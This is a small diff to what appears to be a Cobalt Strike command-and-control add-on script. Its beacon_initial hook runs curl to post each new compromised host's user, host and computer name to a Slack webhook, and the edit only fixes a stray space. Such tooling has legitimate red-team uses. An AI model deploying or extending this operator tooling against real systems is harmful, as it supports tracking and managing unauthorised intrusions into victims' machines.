@@ -15,7 +15,7 @@ on beacon_initial {
 	$computer = beacon_data($1)["computer"];
 	$host = beacon_data($1)["host"];
 	
-	@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "channel": "' . $slack_channel . '", "text":"'.$slack_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .' )"}',$slack_webhookURL);
+	@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "channel": "' . $slack_channel . '", "text":"'.$slack_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')"}',$slack_webhookURL);
 	exec(@curl_command);
 }
 	
